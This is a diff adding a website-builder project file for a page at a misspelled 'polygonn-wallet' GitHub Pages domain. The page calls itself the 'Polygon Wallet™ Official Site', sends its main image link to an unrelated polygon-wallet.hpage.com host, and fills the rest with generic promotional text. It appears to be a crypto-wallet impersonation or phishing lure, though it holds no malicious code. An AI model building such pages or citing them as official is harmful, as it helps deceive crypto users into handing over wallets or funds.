@@ -1,0 +1,147 @@
+{
+  "settings": {
+    "name": "Site 2024-06-06 14:09",
+    "currentPage": "index.html",
+    "theme": {
+      "name": "startm5",
+      "title": "StartM5",
+      "titlePreset": "StartM5",
+      "styling": {
+        "primaryColor": "#9fe870",
+        "secondaryColor": "#ffd7ef",
+        "successColor": "#3a341c",
+        "infoColor": "#320707",
+        "warningColor": "#a0e2e1",
+        "dangerColor": "#ffea64",
+        "mainFont": "Inter Tight",
+        "display1Font": "Inter Tight",
+        "display1Size": 5,
+        "display2Font": "Inter Tight",
+        "display2Size": 4,
+        "display5Font": "Inter Tight",
+        "display5Size": 2,
+        "display7Font": "Inter Tight",
+        "display7Size": 1.4,
+        "display4Font": "Inter Tight",
+        "display4Size": 1.4,
+        "isRoundedImages": true,
+        "isRoundedButtons": true,
+        "isLargeButtons": true,
+        "isGhostButtonBorder": true,
+        "underlinedLinks": false,
+        "isAnimatedOnScroll": false,
+        "isScrollToTopButton": false
+      }
+    },
+    "path": "@PROJECT_PATH@",
+    "versionFirst": "5.9.8",
+    "siteFonts": [],
+    "imageResize": true,
+    "usedWebp": true,
+    "robotsSwitcher": true,
+    "robotsText": "User-agent: *\nDisallow: /cgi-bin\nSitemap: https://polygonn-wallet.github.io/sitemap.xml",
+    "sitemapSwitcher": true,
+    "siteUrl": "https://polygonn-wallet.github.io/",
+    "sitemapSwitcherAuto": "on",
+    "favicon": false,
+    "mbrsiteDomain": "gfvnac1sjb",
+    "cookiesAlert": false,
+    "gdpr": false,
+    "uniqCompNum": 2,
+    "versionPublish": "5.9.8"
+  },
+  "pages": {
+    "index.html": {
+      "settings": {
+        "main": true,
+        "title": "Polygon Wallet™ | Home Official Site",
+        "meta_descr": "WEBPolygon Portal is a gateway to the Polygon ecosystem, where you can connect your wallet, bridge your assets, and access developer tools. You can also purchase MATIC or ETH for …",
+        "header_custom": "",
+        "footer_custom": "",
+        "html_before": ""
+      },
+      "components": [
+        {
+          "alias": false,
+          "_styles": {
+            "background-color": "@bgColor",
+            "padding-top": "(@paddingTop * 15px)",
+            "padding-bottom": "(@paddingBottom * 15px)",
+            "img": {
+              "object-fit": "contain",
+              "border-radius": "0 !important"
+            }
+          },
+          "_name": "image04",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"image03\" group=\"Image & Video\">\n    <mbr-parameters>\n        <header>Size</header>\n        <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" value=\"0\" step=\"1\">\n        <header>Show/Hide</header>\n        <input type=\"checkbox\" title=\"Caption\" name=\"showText\">\n        <header>Background</header>\n        <input type=\"color\" title=\"Color\" name=\"bgColor\" value=\"#ffffff\">\n    </mbr-parameters>\n\n    <div class=\"image-block m-auto\">\n        <a href=\"https://polygon-wallet.hpage.com/\"><img src=\"@PROJECT_PATH@/assets/images/polygon.png\" alt=\"Polygon\"></a>\n        <div mbr-if=\"showText\">\n            <p class=\"mbr-text mt-4 pb-4 align-center mbr-fonts-style\" mbr-theme-style=\"display-7\" data-app-selector=\".mbr-text\">\n                Unlock your true path!\n            </p>\n        </div>\n    </div>\n</section>",
+          "_cid": "ueUbMR1dzx",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {},
+          "_anchor": "image04-0"
+        },
+        {
+          "alias": false,
+          "_styles": {
+            "& when not (@fullScreen)": {
+              "padding-top": "(@paddingTop * 1rem)",
+              "padding-bottom": "(@paddingBottom * 1rem)"
+            },
+            "& when (@bg-type = \"color\")": {
+              "background-color": "@bg-value"
+            },
+            "& when (@bg-type = \"image\")": {
+              "background-image": "url(@bg-value)"
+            },
+            ".mbr-fallback-image.disabled": {
+              "display": "none"
+            },
+            ".mbr-fallback-image": {
+              "display": "block",
+              "background-size": "cover",
+              "background-position": "center center",
+              "width": "100%",
+              "height": "100%",
+              "position": "absolute",
+              "top": "0",
+              "& when (@bg-type = 'video')": {
+                "background-image": "url(@fallBackImage)"
+              }
+            },
+            ".card-wrapper": {
+              "background": "@wrapBgColor",
+              "@media (max-width: 767px)": {
+                "padding": "2rem 1.5rem"
+              },
+              "@media (min-width: 768px) and (max-width: 991px)": {
+                "padding": "2.25rem"
+              },
+              "@media (min-width: 992px)": {
+                "padding": "4rem"
+              }
+            },
+            ".mbr-text, .mbr-section-btn": {
+              "color": "#000000",
+              "text-align": "left"
+            },
+            ".card-title, .card-box": {
+              "text-align": "left",
+              "color": "#000000"
+            }
+          },
+          "_name": "article07",
+          "_sourceTheme": "startm5",
+          "_customHTML": "<section data-bs-version=\"5.1\" class=\"article07\" group=\"Article\" data-bg-video=\"{{bg.type == 'video' && bg.value.url}}\" mbr-class=\"{\n    'mbr-fullscreen': fullScreen,\n    'mbr-parallax-background': bg.parallax}\">\n  <mbr-parameters>\n    <header>Size</header>\n    <input type=\"checkbox\" title=\"Full Screen\" name=\"fullScreen\">\n    <input type=\"checkbox\" title=\"Full Width\" name=\"fullWidth\">\n    <input type=\"range\" inline title=\"Top\" name=\"paddingTop\" min=\"0\" max=\"10\" step=\"1\" value=\"5\">\n    <input type=\"range\" inline title=\"Bottom\" name=\"paddingBottom\" min=\"0\" max=\"10\" step=\"1\" value=\"5\">\n    <input type=\"range\" inline title=\"Content Width\" name=\"contentWidth\" min=\"8\" max=\"12\" step=\"1\" value=\"10\">\n    <header>Show/Hide</header>\n    <input type=\"checkbox\" title=\"Title\" name=\"showTitle\" checked>\n    <input type=\"checkbox\" title=\"Subtitle\" name=\"showSubtitle\" checked>\n    <input type=\"checkbox\" title=\"Text\" name=\"showText\" checked>\n    <input type=\"checkbox\" title=\"Buttons\" name=\"showButtons\">\n    <input type=\"color\" title=\"Wrap Bg\" name=\"wrapBgColor\" value=\"#ffffff\">\n    <header>Background</header>\n    <fieldset type=\"background\" name=\"bg\" parallax>\n      <input type=\"image\" title=\"Image\" value=\"../_images/background1.jpg\" parallax>\n      <input type=\"color\" title=\"Color\" value=\"#edefeb\" selected>\n      <input type=\"video\" title=\"Video\" value=\"https://vimeo.com/428046504\">\n    </fieldset>\n    <header condition=\"bg.type === 'video'\">Fallback Image</header>\n    <input type=\"image\" title=\"Fallback Image\" value=\"../_images/background1.jpg\" name=\"fallBackImage\" condition=\"bg.type === 'video'\">\n    <input type=\"checkbox\" title=\"Overlay\" name=\"overlay\" condition=\"bg.type !== 'color'\" checked>\n    <input type=\"color\" title=\"Overlay Color\" name=\"overlayColor\" value=\"#ffffff\" condition=\"overlay && bg.type !== 'color'\">\n    <input type=\"range\" inline title=\"Opacity\" name=\"overlayOpacity\" min=\"0\" max=\"1\" step=\"0.1\" value=\"0.3\" condition=\"overlay && bg.type !== 'color'\">\n  </mbr-parameters>\n\n  <div class=\"mbr-fallback-image disabled\" mbr-if=\"bg.type == 'video'\"></div>\n  <div class=\"mbr-overlay\" mbr-if=\"overlay && bg.type!== 'color'\" mbr-style=\"{'opacity': overlayOpacity, 'background-color': overlayColor}\"></div>\n  <div mbr-class=\"{'container': !fullWidth, 'container-fluid': fullWidth}\">\n    <div class=\"row justify-content-center\">\n      <div class=\"card col-md-12 col-lg-{{contentWidth}}\">\n        <div class=\"card-wrapper\">\n          <h3 class=\"card-title mbr-fonts-style mbr-white mt-3 mb-4\" mbr-theme-style=\"display-2\" mbr-if=\"showTitle\" data-app-selector=\".card-title, .card-box\"><b>&nbsp;Exploring <a href=\"https://portal.polygon.technology/\" class=\"text-primary\">Polygon Wallet</a></b></h3>\n          <div class=\"row card-box align-left\">\n            \n            \n            \n            <div class=\"item features-without-image col-12 active\">\n              <div class=\"item-wrapper\">\n                <h4 class=\"mbr-section-subtitle mbr-fonts-style mb-3\" mbr-if=\"showSubtitle\" data-app-selector=\".mbr-section-subtitle\" mbr-theme-style=\"display-5\"><b>Your Gateway to Seamless DeFi Transactions</b></h4>\n                <p class=\"mbr-text mbr-fonts-style\" mbr-theme-style=\"display-7\" mbr-if=\"showText\" data-app-selector=\".mbr-text, .mbr-section-btn\">In the bustling world of decentralized finance (DeFi), accessibility and user experience are paramount. As the DeFi landscape continues to expand, the need for intuitive and efficient wallet solutions becomes increasingly apparent. Enter Polygon Wallet, a user-friendly and versatile wallet designed to simplify the complexities of decentralized finance. In this article, we'll delve into the intricacies of Polygon Wallet, exploring its features, advantages, and its role in revolutionizing the DeFi experience.<br><br>Introduction to Polygon Wallet<br>Polygon Wallet, formerly known as Matic Wallet, is a secure and easy-to-use wallet designed specifically for the Polygon network. Launched as part of the broader Polygon ecosystem, Polygon Wallet aims to provide users with a seamless and intuitive interface to interact with decentralized applications (dApps), swap tokens, and manage their digital assets. As a non-custodial wallet, Polygon Wallet empowers users with full control over their funds while prioritizing security and convenience.<br><br>Seamless Integration with Polygon Network<br>At the heart of Polygon Wallet lies its seamless integration with the Polygon network, a layer 2 scaling solution for Ethereum. Leveraging the scalability and low transaction fees of the Polygon network, Polygon Wallet offers users lightning-fast transactions and minimal fees, making it an ideal choice for those seeking an efficient DeFi experience. Whether you're trading tokens, participating in yield farming, or interacting with dApps, Polygon Wallet ensures a smooth and hassle-free experience on the Polygon network.<br><br>Intuitive User Interface<br>One of the standout features of Polygon Wallet is its intuitive user interface, designed to cater to both novice and experienced users alike. The wallet's clean and user-friendly design makes it easy to navigate, allowing users to manage their assets, view transaction history, and interact with dApps with ease. Additionally, Polygon Wallet supports multiple languages, further enhancing its accessibility to a global audience.<br><br>Multi-Asset Support<br>Polygon Wallet supports a wide range of assets, including Ethereum (ETH) and various ERC-20 tokens. This multi-asset support enables users to manage all their digital assets within a single wallet, streamlining the asset management process. Whether you're holding cryptocurrencies for investment purposes or using them for day-to-day transactions, Polygon Wallet provides a convenient and secure solution for managing your assets.<br><br>Security and Custody<br>Security is paramount when it comes to managing digital assets, and Polygon Wallet prioritizes the safety of users' funds. As a non-custodial wallet, Polygon Wallet does not hold or control users' private keys, ensuring that users have full control over their funds at all times. Additionally, Polygon Wallet employs state-of-the-art security measures, including encryption and secure key management, to protect users' assets from unauthorized access or theft.<br><br>Decentralized Applications (dApps) Integration<br>Polygon Wallet seamlessly integrates with a wide range of decentralized applications (dApps) built on the Polygon network. Whether you're looking to swap tokens, participate in decentralized finance (DeFi) protocols, or engage in gaming and NFT marketplaces, Polygon Wallet provides easy access to a diverse ecosystem of dApps. With just a few clicks, users can connect their Polygon Wallet to their favorite dApps and start interacting with the decentralized web.<br><br>Cross-Platform Compatibility<br>Polygon Wallet is available across multiple platforms, including web, desktop, and mobile devices, ensuring that users can access their funds and interact with dApps anytime, anywhere. Whether you prefer to manage your assets on your desktop computer, smartphone, or tablet, Polygon Wallet provides a seamless and consistent experience across all devices. This cross-platform compatibility enhances the flexibility and convenience of Polygon Wallet, allowing users to stay connected to the Polygon network wherever they go.<br><br>Conclusion: Empowering the Future of DeFi<br>In conclusion, Polygon Wallet plays a crucial role in empowering users to embrace the world of decentralized finance (DeFi) with confidence and ease. With its seamless integration with the Polygon network, intuitive user interface, multi-asset support, and robust security features, Polygon Wallet offers a comprehensive solution for managing digital assets and interacting with decentralized applications (dApps). As DeFi continues to evolve and expand, Polygon Wallet stands as a testament to the potential of blockchain technology to revolutionize the way we manage and exchange value in the digital age.<br></p>\n              </div>\n            </div>\n          </div>\n          <div mbr-buttons mbr-theme-style=\"display-7\" class=\"mbr-section-btn\" mbr-if=\"showButtons\" data-toolbar=\"-mbrBtnMove\">\n            <a class=\"btn btn-primary\" href=\"https://mobiri.se\" data-app-placeholder=\"Type Text\">Start Now</a>\n          </div>\n        </div>\n      </div>\n    </div>\n  </div>\n</section>",
+          "_cid": "ueUbNtDkf6",
+          "_anchor": "article07-1",
+          "_protectedParams": [],
+          "_global": false,
+          "_once": false,
+          "_params": {}
+        }
+      ]
+    }
+  }
+}
